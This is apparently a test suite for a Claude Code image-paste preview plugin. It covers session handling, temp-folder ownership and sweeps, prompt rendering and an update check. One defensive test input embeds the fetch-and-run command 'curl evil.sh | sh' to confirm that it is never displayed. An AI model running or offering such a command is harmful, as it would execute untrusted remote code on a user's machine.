// asked of the engine as the paste lands.
for (const os of ['mac', 'linux', 'windows'] as const) {
  {
    test(`${os}: after /clear or /resume the paste is found where the new conversation keeps it`, async ($, on) => {
      const clock = mock.clock(on)
      const system = SYSTEMS[os]
      let session = SESSION
      const { w, box, dir, file, project, sep } = world(on, system, { session: () => session })
      await paste($, box)
      await until(clock, () => asked(w).length > 0)
      expect(asked(w)[0]?.picture).toBe(`${project}${sep}${SESSION}${sep}images${sep}1.png`)

      const images = `${project}${sep}${OTHER}${sep}images`
      dir(images, ['2.png'])
      file(`${images}${sep}2.png`, 120_000, pngBytes(1600, 900))
      session = OTHER
      box.text = '[Image #2] '
      await until(clock, () => asked(w).length > 1)
      expect(asked(w)[1]).toEqual({ picture: `${images}${sep}2.png`, out: `${system.edits.replace('abcdef12', 'fedcba98')}${sep}2.png` })
      // Found at once: the clipboard was never read for it.
      expect(w.runs.filter(argv => argv[0] === 'pngpaste' || argv[0] === 'sh' || argv.some(a => a.includes('Clipboard')))).toEqual([])
    })
  }
}

// An editor still open when the conversation changes: its edit is the conversation's it
// was pasted in, and Enter there points Claude at it; the next conversation's prompt
// does not.
test('linux: an edit finished after /resume belongs to the conversation it was pasted in', async ($, on) => {
  const clock = mock.clock(on)
  let session = SESSION
  const hold = deferred()
  const { w, box, dir, file, project, sep } = world(on, SYSTEMS.linux, { session: () => session, hold: hold.promise })
  await paste($, box)
  await until(clock, () => asked(w).length > 0)
  const images = `${project}${sep}${OTHER}${sep}images`
  dir(images, ['2.png'])
  file(`${images}${sep}2.png`, 120_000, pngBytes(1600, 900))
  session = OTHER
  await $.session.end({ reason: 'resume', sessionId: SESSION, resume: { id: SESSION } })
  box.text = '[Image #2] '
  await until(clock, () => false)
  hold.release()
  await until(clock, () => asked(w).length > 1)
  await until(clock, () => false)

  await $.prompt.submit({ text: '[Image #2] and this?', wait: false, origin: { kind: 'composer' } })
  expect(w.context.some(note => note.includes('[Image #1]'))).toBe(false)
  session = SESSION
  await until(clock, () => false)
  await $.prompt.submit({ text: '[Image #1] what is this?', wait: false, origin: { kind: 'composer' } })
  expect(w.context.some(note => note.includes('/tmp/paste-preview-501/abcdef12/1.png'))).toBe(true)
})

// Should Claude Code ever number a paste of the new conversation as one of the old's,
// the old conversation's edit, finishing late, does not become the new paste's.
test('linux: a number used again in the next conversation is not given the last one\'s edit', async ($, on) => {
  const clock = mock.clock(on)
  let session = SESSION
  const hold = deferred()
  const { w, box, dir, file, project, sep } = world(on, SYSTEMS.linux, { session: () => session, hold: hold.promise, says: ['SAVED', 'CANCELLED'] })
  await paste($, box)
  await until(clock, () => asked(w).length > 0)
  const images = `${project}${sep}${OTHER}${sep}images`
  dir(images, ['1.png'])
  file(`${images}${sep}1.png`, 120_000, pngBytes(1200, 900))
  session = OTHER
  await $.session.end({ reason: 'clear', sessionId: SESSION, resume: { id: SESSION } })
  box.text = ''
  await until(clock, () => false)
  box.text = '[Image #1] '
  await until(clock, () => false)
  hold.release()
  await until(clock, () => asked(w).length > 1)
  await until(clock, () => false)
  expect(asked(w)[1]?.picture).toBe(`${images}${sep}1.png`)

  const band = await $.ui.mount({ ...BAND })
  expect((await band.find({ type: 'Text', text: /^Image #1/ }))?.text).toBe('Image #1')
  await band.unmount()
  await $.prompt.submit({ text: '[Image #1] and this?', wait: false, origin: { kind: 'composer' } })
  expect(w.context).toEqual([])
})

// Issue #6 as reported: a resumed session whose start never reached the mod. The first
// edit of the box (the paste itself) starts it, and the half-second look follows.
test('linux: with no session.start, the first change of the box starts the mod', async ($, on) => {
  const clock = mock.clock(on)
  const { w, box, pasted, dir, file, sep } = world(on, SYSTEMS.linux)
  await typeIn($, box, '[Image #1] ')
  await until(clock, () => asked(w).length > 0)
  expect(asked(w)[0]?.picture).toBe(pasted)
  const images = pasted.slice(0, pasted.lastIndexOf(sep))
  dir(images, ['1.png', '2.png'])
  file(`${images}${sep}2.png`, 120_000, pngBytes(1200, 900))
  box.text = '[Image #1] [Image #2] '
  await until(clock, () => asked(w).length > 1)
  expect(asked(w)[1]?.picture).toBe(`${images}${sep}2.png`)
})

// The week-old sweep runs as the process starts; a conversation resumed after a week has
// a folder that old. Made before the sweep had finished, that folder was swept away
// under it, and the edit had nowhere to be written.
for (const os of ['mac', 'linux', 'windows'] as const) {
  test(`${os}: a conversation's folder is made once the week-old sweep has finished`, async ($, on) => {
    const clock = mock.clock(on)
    const system = SYSTEMS[os]
    const sweep = deferred()
    const { w, box } = world(on, system, { holdSweep: sweep.promise })
    await paste($, box)
    for (let i = 0; i < 4; i++) await clock.advance(250)
    sweep.release()
    await until(clock, () => asked(w).length > 0)
    const swept = w.acts.indexOf('swept')
    const made = w.acts.findIndex(act => (act.startsWith('run mkdir') || act.startsWith('write ')) && act.includes(system.edits))
    expect(swept).toBeGreaterThanOrEqual(0)
    expect(made).toBeGreaterThan(swept)
  })
}

// The sweep may take no longer than this: a stuck one is cut off and the paste goes on.
test('the week-old sweep is given ten seconds at most', async ($, on) => {
  const clock = mock.clock(on)
  const { w, box } = world(on, SYSTEMS.linux)
  await paste($, box)
  await until(clock, () => asked(w).length > 0)
  const at = w.runs.findIndex(argv => argv.includes('-mtime'))
  expect(at).toBeGreaterThanOrEqual(0)
  expect(w.runTimeouts[at]).toBe(10_000)
})

// Where the mod cannot set itself up (a command it needs is missing), it tries again now
// and then, not twice a second for the rest of the session.
test('linux: a set-up that failed is tried again after ten seconds, not on every look', async ($, on) => {
  const clock = mock.clock(on)
  const { w, box } = world(on, SYSTEMS.linux, { fails: ['id -u'] })
  const tries = () => w.runs.filter(argv => argv.join(' ') === 'id -u').length
  await paste($, box)
  for (let i = 0; i < 32; i++) await clock.advance(250)
  expect(tries()).toBe(1)
  for (let i = 0; i < 24; i++) await clock.advance(250)
  expect(tries()).toBe(2)
  expect(asked(w)).toEqual([])
})

// Once it can, it does: the paste in the box is picked up, and on macOS the panel is
// kept warm again.
test('mac: a set-up that failed and then works keeps the panel warm', async ($, on) => {
  const clock = mock.clock(on)
  const fails = ['id -u']
  const { w, box } = world(on, SYSTEMS.mac, { fails })
  await paste($, box)
  for (let i = 0; i < 8; i++) await clock.advance(250)
  expect(w.spawns).toEqual([])
  fails.length = 0
  await until(clock, () => asked(w).length > 0)
  expect(w.spawns.some(argv => argv[1] === 'serve')).toBe(true)
  expect(asked(w)).toHaveLength(1)
})

const ROW = {
  plugin: 'paste-preview',
  surface: 'terminal',
  component: 'UserMessage',
  props: { text: '[Image #1] look', origin: { kind: 'composer' }, isExpanded: false },
} as const

// Every sent prompt with a picture read one list of all pastes, so each new paste drew
// all of them again: the fifteenth paste of a session redrew thirteen rows. A row reads
// the pictures it names and nothing else, so a paste of another number never draws it.
test('a sent prompt reads only the pictures it names', async ($, on) => {
  const clock = mock.clock(on)
  const { w, box, pasted, dir, file, sep } = world(on, SYSTEMS.linux)
  // What the row reads while it is drawn: what a later write draws it again for.
  let reads: string[] | undefined
  on('state.get', ($, e, next) => {
    reads?.push(e.id === undefined ? e.key : `${e.key}:${e.id}`)
    return next(e)
  })
  await paste($, box)
  await until(clock, () => w.spawns.length > 0)
  const images = pasted.slice(0, pasted.lastIndexOf(sep))
  dir(images, ['1.png', '2.png', '3.png'])
  for (const n of [2, 3]) file(`${images}${sep}${n}.png`, 120_000, pngBytes(1200, 900))
  box.text = '[Image #1] [Image #2] [Image #3] '
  await until(clock, () => w.spawns.length > 2)
  await until(clock, () => false)

  reads = []
  const row = await $.ui.mount({ ...ROW, requestId: 'row-1', props: { ...ROW.props, text: '[Image #3] and [Image #1]' } })
  expect(reads.sort()).toEqual(['shot:1', 'shot:3'])
  reads = undefined
  // Drawn in the order the text names them.
  expect((await row.findAll({ type: 'Text', text: /^Image #\d/ })).map(t => t.text)).toEqual(['Image #3 edited', 'Image #1 edited'])
  expect(await row.findAll({ type: 'Image' })).toHaveLength(2)
  await row.unmount()
})

// A conversation resumed after /clear or /resume shows its own sent prompts: a number
// the process gave a picture in another conversation is not theirs to show.
// What Claude Code draws for a row the mod leaves to it.
const engineRow = (on: On) =>
  on('ui.render', ($, e) => {
    const { Text } = $.ui.resolve(e)
    return <Text key="engine">engine</Text>
  })

test('a sent prompt of another conversation is not given this one\'s picture', async ($, on) => {
  const clock = mock.clock(on)
  let session = SESSION
  engineRow(on)
  const { w, box } = world(on, SYSTEMS.linux, { session: () => session })
  await paste($, box)
  await until(clock, () => w.spawns.length > 0)
  await until(clock, () => false)
  const here = await $.ui.mount({ ...ROW, requestId: 'row-here' })
  expect(await here.find({ type: 'Image' })).toBeDefined()
  await here.unmount()

  session = 'fedcba98-7654-3210-fedc-ba9876543210'
  await $.session.end({ reason: 'resume', sessionId: SESSION, resume: { id: SESSION } })
  const other = await $.ui.mount({ ...ROW, requestId: 'row-there', props: { ...ROW.props, text: '[Image #1] from that conversation' } })
  expect(await other.find({ type: 'Image' })).toBeUndefined()
  expect(await other.find({ type: 'Text', text: 'engine' })).toBeDefined()
  await other.unmount()
})

// The full view (ctrl+o) is Claude Code's own row, pictures or not.
test('a sent prompt keeps Claude Code\'s row in the full view', async ($, on) => {
  const clock = mock.clock(on)
  engineRow(on)
  const { w, box } = world(on, SYSTEMS.linux)
  await paste($, box)
  await until(clock, () => w.spawns.length > 0)
  await until(clock, () => false)
  const row = await $.ui.mount({ ...ROW, requestId: 'row', props: { ...ROW.props, isExpanded: true } })
  expect(await row.find({ type: 'Image' })).toBeUndefined()
  expect(await row.find({ type: 'Text', text: 'engine' })).toBeDefined()
  await row.unmount()
})

// The same paste seen twice at once (two changes of the box, or one and the half-second
// look) opens one editor.
test('linux: a paste seen by two looks at once opens one editor', async ($, on) => {
  const clock = mock.clock(on)
  const { w, box } = world(on, SYSTEMS.linux)
  await $.session.start({ cwd: '/home/me/project', surface: 'terminal', isInteractive: true })
  await clock.advance(250)
  // The paste, and a key typed straight after it, both seen before the first look ends.
  await Promise.all([typeIn($, box, '[Image #1] '), typeIn($, box, '')])
  await until(clock, () => false)
  expect(asked(w)).toHaveLength(1)
})

// Pasted within half a second of /clear, before the mod has looked again: still one
// editor, on the new conversation's copy, which lands a moment later.
test('linux: a paste right after /clear opens one editor', async ($, on) => {
  const clock = mock.clock(on)
  let session = SESSION
  const { w, box, dir, file, project, sep } = world(on, SYSTEMS.linux, { session: () => session })
  await paste($, box)
  await until(clock, () => asked(w).length > 0)
  await until(clock, () => false)
  session = OTHER
  box.text = ''
  await typeIn($, box, '[Image #2] ')
  const images = `${project}${sep}${OTHER}${sep}images`
  dir(images, [])
  for (let i = 0; i < 30; i++) await clock.advance(25)
  dir(images, ['2.png'])
  file(`${images}${sep}2.png`, 120_000, pngBytes(1600, 900))
  await until(clock, () => false)
  expect(asked(w).slice(1)).toEqual([{ picture: `${images}${sep}2.png`, out: '/tmp/paste-preview-501/fedcba98/2.png' }])
})

// Edit pressed in the band, its editor queued behind another, and the conversation
// changes before it opens: the edit is the conversation's the button was pressed in.
test('linux: Edit belongs to the conversation it was pressed in', async ($, on) => {
  const clock = mock.clock(on)
  let session = SESSION
  const hold = deferred()
  const { w, box } = world(on, SYSTEMS.linux, { session: () => session, hold: hold.promise })
  await paste($, box)
  await until(clock, () => asked(w).length > 0)
  const band = await $.ui.mount({ ...BAND })
  await band.press({ key: 'edit-1' })
  await band.unmount()
  session = OTHER
  box.text = ''
  await until(clock, () => false)
  hold.release()
  await until(clock, () => asked(w).length > 1)
  expect(asked(w)[1]?.out).toBe('/tmp/paste-preview-501/abcdef12/1.png')
})

// The working folder: made for the user alone before anything is put in it, and a
// resumed conversation's folder marked as in use, so a sweep elsewhere leaves it.
for (const os of ['mac', 'linux'] as const) {
  test(`${os}: the working folder is the user's alone from the start, and a conversation's is marked in use`, async ($, on) => {
    const clock = mock.clock(on)
    const system = SYSTEMS[os]
    const { w, box } = world(on, system)
    await paste($, box)
    await until(clock, () => asked(w).length > 0)
    const root = system.edits.replace(/\/abcdef12$/, '')
    const first = w.acts.findIndex(act => act.includes(root))
    expect(w.acts[first]).toBe(`run mkdir -p -m 700 ${root}`)
    const made = w.acts.indexOf(`run mkdir -p -m 700 ${root} ${system.edits}`)
    expect(made).toBeGreaterThan(first)
    expect(w.acts.indexOf(`run touch ${system.edits}`)).toBeGreaterThan(made)
  })
}

// A read of state that fails once (the host busy) does not lose the paste: it is looked
// for all the same.
test('linux: a paste whose state could not be read once is still picked up', async ($, on) => {
  const clock = mock.clock(on)
  let refused = 0
  on('state.get', ($, e, next) => {
    if (e.key === 'shot' && refused === 0) {
      refused += 1
      return { deny: 'the host is busy' }
    }
    return next(e)
  })
  const { w, box } = world(on, SYSTEMS.linux)
  await paste($, box)
  await until(clock, () => asked(w).length > 0)
  expect(refused).toBe(1)
  expect(asked(w)).toHaveLength(1)
})

// ——— a newer version ———
//
// Claude Code updates a plugin from a marketplace like this one only where the person has
// turned on the marketplace's auto-update. So once a day the mod asks GitHub for its
// manifest, and where a newer version is out says so, once, with where to update and how
// to stay current.

const LATEST = 'https://raw.githubusercontent.com/alan890104/claude-code-paste-preview/main/.claude-plugin/plugin.json'
const DAY = 24 * 60 * 60 * 1000
// The test's clock starts here, so what the store holds is read against it.
const NOW = 1_800_000_000_000
const startSession = ($: Engine, isInteractive = true) => $.session.start({ cwd: '/home/me/project', surface: isInteractive ? 'terminal' : null, isInteractive })
const settle = async (clock: { advance: (ms: number) => Promise<void> }) => {
  for (let i = 0; i < 40; i++) await clock.advance(250)
}

test('a newer version is told once, in the person\'s language, with where to update', async ($, on) => {
  const clock = mock.clock(on, { now: NOW })
  const { w } = world(on, { ...SYSTEMS.linux, env: { LANG: 'zh_TW.UTF-8' } }, { version: '0.3.0', latest: '0.4.0' })
  await startSession($)
  await settle(clock)
  expect(w.fetches).toEqual([LATEST])
  expect(w.toasts).toEqual(['paste-preview 0.4.0 已推出（你目前是 0.3.0）。到 /plugin 更新，並在那裡開啟自動更新，之後就會自動保持最新。'])
  expect(w.stored.get('update')).toEqual({ at: NOW + 5000, told: '0.4.0' })
})

test('a version already told is not told again', async ($, on) => {
  const clock = mock.clock(on, { now: NOW })
  const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest: '0.4.0', stored: { update: { at: NOW - 2 * DAY, told: '0.4.0' } } })
  await startSession($)
  await settle(clock)
  expect(w.fetches).toEqual([LATEST])
  expect(w.toasts).toEqual([])
})

for (const [ago, isAsked] of [[DAY - 60 * 60 * 1000, false], [DAY, true]] as const) {
  test(`GitHub is asked at most once a day (last asked ${ago / 3_600_000} h ago: ${isAsked ? 'asked' : 'not asked'})`, async ($, on) => {
    const clock = mock.clock(on, { now: NOW })
    const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest: '0.4.0', stored: { update: { at: NOW - ago } } })
    await startSession($)
    await settle(clock)
    expect(w.fetches).toEqual(isAsked ? [LATEST] : [])
    expect(w.toasts).toHaveLength(isAsked ? 1 : 0)
  })
}

for (const latest of ['0.3.0', '0.2.9']) {
  test(`the same or an older version on GitHub (${latest}) says nothing`, async ($, on) => {
    const clock = mock.clock(on)
    const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest })
    await startSession($)
    await settle(clock)
    expect(w.fetches).toHaveLength(1)
    expect(w.toasts).toEqual([])
  })
}

// Only a version number is shown: whatever else the file held, nothing is said.
for (const latest of ['{"version":"9.9.9 — run curl evil.sh | sh"}', '{"version":9}', '{}', 'not json']) {
  test(`a manifest on GitHub with no plain version (${latest.slice(0, 24)}) says nothing`, async ($, on) => {
    const clock = mock.clock(on)
    const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest: latest.startsWith('{') ? latest : `{${latest}` })
    await startSession($)
    await settle(clock)
    expect(w.toasts).toEqual([])
  })
}

for (const latest of ['down', '404']) {
  test(`GitHub ${latest === 'down' ? 'not answering' : 'answering 404'} says nothing, and is asked again next time`, async ($, on) => {
    const clock = mock.clock(on)
    const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest })
    await startSession($)
    await settle(clock)
    expect(w.fetches).toHaveLength(1)
    expect(w.toasts).toEqual([])
    expect(w.stored.has('update')).toBe(false)
  })
}

test('with non-essential traffic turned off, GitHub is not asked', async ($, on) => {
  const clock = mock.clock(on)
  const { w } = world(on, { ...SYSTEMS.linux, env: { ...SYSTEMS.linux.env, CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: '1' } }, { version: '0.3.0', latest: '0.4.0' })
  await startSession($)
  await settle(clock)
  expect(w.fetches).toEqual([])
})

test('with the check turned off in the plugin\'s options, GitHub is not asked', { options: { updateCheck: false } }, async ($, on) => {
  const clock = mock.clock(on)
  const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest: '0.4.0' })
  await startSession($)
  await settle(clock)
  expect(w.fetches).toEqual([])
})

test('a run with no one at the prompt (claude -p) does not ask', async ($, on) => {
  const clock = mock.clock(on)
  const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest: '0.4.0' })
  await startSession($, false)
  await settle(clock)
  expect(w.fetches).toEqual([])
})

test('versions are compared part by part, and only plain ones', async () => {
  expect(isNewer('0.10.0', '0.9.9')).toBe(true)
  expect(isNewer('1.0.0', '0.99.99')).toBe(true)
  expect(isNewer('0.3.1', '0.3.0')).toBe(true)
  expect(isNewer('0.3.0', '0.3.0')).toBe(false)
  expect(isNewer('0.2.9', '0.3.0')).toBe(false)
  expect(isNewer('1.0.0-beta', '0.3.0')).toBe(false)
  expect(isNewer('1.0', '0.3.0')).toBe(false)
  expect(isNewer('0.4.0', '')).toBe(false)
})

// ——— the working folder belongs to the user ———
//
// mkdir -p accepts a folder that is already there, whoever made it. In a shared temp
// folder another account could make the mod's first: then read the pictures put in it,
// swap the edit Claude is pointed at, or (macOS) leave a panel binary that would be run.
// A folder that is not the user's (theirs, a real folder, no one else can write in it) is
// not used; a fresh one of the mod's own is made instead. One of theirs that others can
// read (made by another tool's mkdir) is closed to them and kept, not made anew each start.
for (const os of ['mac', 'linux'] as const) {
  test(`${os}: a working folder another account made first is not used`, async ($, on) => {
    const clock = mock.clock(on)
    const system = SYSTEMS[os]
    const { w, box } = world(on, system, { foreignRoot: true })
    await paste($, box)
    await until(clock, () => asked(w).length > 0)
    const root = system.edits.replace(/\/abcdef12$/, '')
    expect(w.runs).toContainEqual(['find', root, '-maxdepth', '0', '-type', 'd', '-user', '501', '!', '-perm', '-020', '!', '-perm', '-002'])
    const own = `${root}.Ab12Cd`
    expect(asked(w)[0]?.out).toBe(`${own}/abcdef12/1.png`)
    // Nothing of the other account's folder is run or written to after the check.
    const checked = w.acts.findIndex(act => act.startsWith('run find') && act.includes('-perm'))
    const into = (act: string) => act.includes(`${root}/`) || act.endsWith(` ${root}`)
    expect(w.acts.slice(checked + 1).filter(into)).toEqual([])
  })

  test(`${os}: a working folder of the user's that others can read is closed to them and kept`, async ($, on) => {
    const clock = mock.clock(on)
    const system = SYSTEMS[os]
    const { w, box } = world(on, system)
    await paste($, box)
    await until(clock, () => asked(w).length > 0)
    const root = system.edits.replace(/\/abcdef12$/, '')
    const checked = w.acts.indexOf(`run find ${root} -maxdepth 0 -type d -user 501 ! -perm -020 ! -perm -002`)
    const closed = w.acts.indexOf(`run chmod 700 ${root}`)
    expect(checked).toBeGreaterThan(-1)
    expect(closed).toBeGreaterThan(checked)
    // Closed first, before anything is put in it or swept.
    expect(w.acts.slice(checked + 1, closed).filter(act => act.includes(root))).toEqual([])
    expect(w.runs.filter(argv => argv[0] === 'mktemp')).toEqual([])
    expect(asked(w)[0]?.out).toBe(`${system.edits}/1.png`)
  })
}

// A folder of the user's that could not be closed is not used either.
test('linux: a working folder that could not be closed to others is not used', async ($, on) => {
  const clock = mock.clock(on)
  const { w, box } = world(on, SYSTEMS.linux, { fails: ['chmod 700 /tmp/paste-preview-501'] })
  await paste($, box)
  await until(clock, () => asked(w).length > 0)
  expect(asked(w)[0]?.out).toBe('/tmp/paste-preview-501.Ab12Cd/abcdef12/1.png')
})

// A paste whose picture could not be kept in state (the host busy) still opens one editor.
test('linux: a paste whose state could not be written once opens one editor', async ($, on) => {
  const clock = mock.clock(on)
  let refused = 0
  on('state.set', ($, e, next) => {
    if (e.key === 'shot' && refused === 0) {
      refused += 1
      return { deny: 'the host is busy' }
    }
    return next(e)
  })
  // Its editor stays open through several half-second looks.
  const hold = deferred()
  const { w, box } = world(on, SYSTEMS.linux, { hold: hold.promise })
  await paste($, box)
  for (let i = 0; i < 12; i++) await clock.advance(250)
  hold.release()
  await until(clock, () => false)
  expect(refused).toBe(1)
  expect(asked(w)).toHaveLength(1)
})

// Edit opens the picture the band showed when it was pressed, whatever the number holds
// by the time the editor before it closes.
test('linux: Edit opens the picture the band showed', async ($, on) => {
  const clock = mock.clock(on)
  let session = SESSION
  const hold = deferred()
  const { w, box, pasted, dir, file, project, sep } = world(on, SYSTEMS.linux, { session: () => session, hold: hold.promise, says: ['CANCELLED', 'CANCELLED', 'CANCELLED'] })
  await paste($, box)
  await until(clock, () => asked(w).length > 0)
  await until(clock, () => false)
  const band = await $.ui.mount({ ...BAND })
  await band.press({ key: 'edit-1' })
  await band.unmount()
  // The next conversation numbers a paste #1 too, while the first editor is still open.
  const images = `${project}${sep}${OTHER}${sep}images`
  dir(images, ['1.png'])
  file(`${images}${sep}1.png`, 120_000, pngBytes(1200, 900))
  session = OTHER
  box.text = '[Image #1] '
  await until(clock, () => false)
  hold.release()
  await until(clock, () => asked(w).length > 2)
  expect(asked(w)[1]?.picture).toBe(pasted)
})

// ——— from 0.2 ———
//
// An update applied with /reload-plugins runs the new code in the same session, with the
// state 0.2 kept: every paste in one list. The pastes in the box are carried over, so none
// is taken for new (its editor opened again) and an edit made before still goes with it.
test('linux: pastes kept by 0.2 in a session updated with /reload-plugins are carried over', async ($, on) => {
  const clock = mock.clock(on)
  const old = { n: 1, file: '/tmp/paste-preview-501/abcdef12/1.png', thumb: '/tmp/paste-preview-501/abcdef12/1.thumb.png', gen: 1, width: 1600, height: 900, isEdited: true, ratio: 16 / 9, isLarge: false }
  on('state.get', ($, e, next) => (e.key === 'shots' ? { value: { value: [old], version: 3 } } : next(e)))
  const { w, box } = world(on, SYSTEMS.linux)
  await paste($, box)
  await until(clock, () => false)
  expect(asked(w)).toEqual([])
  const band = await $.ui.mount({ ...BAND })
  expect((await band.find({ type: 'Text', text: /^Image #1/ }))?.text).toBe('Image #1 edited')
  await band.unmount()
  await $.prompt.submit({ text: '[Image #1] what is this?', wait: false, origin: { kind: 'composer' } })
  expect(w.context.some(note => note.includes('/tmp/paste-preview-501/abcdef12/1.png'))).toBe(true)
})

// 0.2 kept macOS edits in /private/tmp/paste-preview. Nothing new goes there; what it
// holds is swept as before (folders a week old), where the folder is this user's.
for (const isOwn of [true, false]) {
  test(`mac: the folder 0.2 used is ${isOwn ? 'swept of week-old folders' : 'left alone where it is another account\'s'}`, async ($, on) => {
    const clock = mock.clock(on)
    const { w, box } = world(on, SYSTEMS.mac, { foreignOld: !isOwn })
    await paste($, box)
    await until(clock, () => asked(w).length > 0)
    expect(w.runs).toContainEqual(['find', '/private/tmp/paste-preview', '-maxdepth', '0', '-type', 'd', '-user', '501'])
    const swept = w.runs.filter(argv => argv[1] === '/private/tmp/paste-preview' && argv.includes('-mtime'))
    expect(swept).toEqual(isOwn ? [['find', '/private/tmp/paste-preview', '-mindepth', '1', '-maxdepth', '1', '-mtime', '+7', '-exec', 'rm', '-rf', '{}', '+']] : [])
  })
}

